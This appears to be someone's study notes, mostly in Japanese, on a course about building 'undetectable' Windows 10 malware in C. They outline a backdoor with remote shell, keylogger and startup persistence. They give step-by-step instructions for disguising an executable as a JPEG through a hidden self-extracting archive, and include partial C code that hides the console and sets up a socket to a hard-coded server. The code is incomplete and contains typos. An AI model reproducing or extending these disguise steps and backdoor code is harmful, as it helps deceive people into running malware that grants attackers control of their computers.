# Build Undetectable Malware Using C Language: Ethical Hacking


## Section1. Introduction & Welcome to Hacking with C!


### Lecture1. Ethical Hacking Advanced - Learn How To build Undetectable Malware Using C

### Lecture2. What Are We Going To Learn In This Course & What You Need To Know!
- 本講義では、Windows10を対象とした多目的なマルウェアを作成する。
- 本講義はマルウェア周辺ツールを作成したり、ペネトレーションテストを実行するためにマルウェアを作成したい人向けの講義である。

### Lecture3. Our Malware In Action & Hacking Fully Secured And Updated Windows 10 Machine
- 本講義のマルウェアは以下の機能を備えている。
    - サーバとの通信
    - 任意のコマンド実行
    - フォルダへのアクセス
    - マルウェアのjpegファイルへの偽装
    - キーロガー
    - 起動時に自動的にマルウェアが起動する。

### Lecture4. How To Make An .EXE Transform Into Any Other File Type (.jpg, .pdf, .mp4 ... )
- PEファイルフォーマットの実行形式ファイルを他のファイル形式に変更する方法は以下の通りである。
    - Winnyのダウンロードを実施する。
    - ICOコンバーターを使用し、JpegファイルからICOファイルを作成する。
    - マルウェアとJpegファイルをアーカイブする。
        - SFXオプションを開く。
        - Setuoを開く。
        - Run after extractionで画像ファイルとバックドアの実行形式ファイル名を記載する。
        - Modesを開く。
        - unpack the temporary folderにチェックを入れる。
        - Hide allにチェックを入れる。
        - Advancedを開く。
        - Load SPX icon from the fileからICOファイルを選択する。
        - Updateを開く。
        - Extract and Update filesにチェックを入れる。
        - Overwrite all filesにチェックを入れる。
        - OKを押す。
    - 上記の手順は、他のファイル形式でも実行可能である。
    - **TODO 上記の手順を実行する。**
    - **TODO 上記の手順の自動化の実装を行う。**


## Section2. Hiding Our Program & Defining Connection Points


### Lecture5. Explaining Malware Structure & Including Needed Libraries
- マルウェアは以下の機能を持つ。
    1. サーバとの通信機能を実装する。
    2. シェルを実行できるようにする。
    3. 起動と同時に自動的に実行される。
    4. 他のプログラムを開始したリ、停止したリさせる事が出来る。
    5. キーロガーが実行出来る。
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
```

### Lecture6. Hiding Our Program Console Window
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

// APIENTRYは、
// HINSTANCEは、
// LPSTRは、

int APIENTRY WinMain(HINSTANCE hInstance, HINSANCE hPrev, LPSTR lpCmdLine, int nCmShow){
    // コンソールを隠すためのコード
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, nCmdShow);
}
```


### Lecture7. Defining Connection Points To Our Backdoor
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

// APIENTRYは、
// HINSTANCEは、
// LPSTRは、

int socke;

int APIENTRY WinMain(HINSTANCE hInstance, HINSANCE hPrev, LPSTR lpCmdLine, int nCmShow){
    // コンソールを隠すためのコード
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, nCmdShow);

    // ソケット通信を行う
    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsaData;    //Windows Socketの情報を含んでいる構造体

    ServIP = "192.168.1.8";
    ServPort = 50005;

    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0){
        exit(1);
    }

    sock = socket(AF_INET, SCOK_STREAM, 0);

    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
    ServAddr.sin_port = htons(ServPort);

}
```

### Lecture8. Note for next lecture ("goto instruction" in C programming)

### Lecture9. Attempting Connection Every 10 Seconds With Our Target


## Section3. Building Shell Function & Executing Commands




## Section4. Switching Directories Inside Of A Program




## Section5. Creating Persistence & Nesting Our Program In Windows Registry




## Section6. Adding Keylogger To Our Malware




## Section7. Hacking Windows 10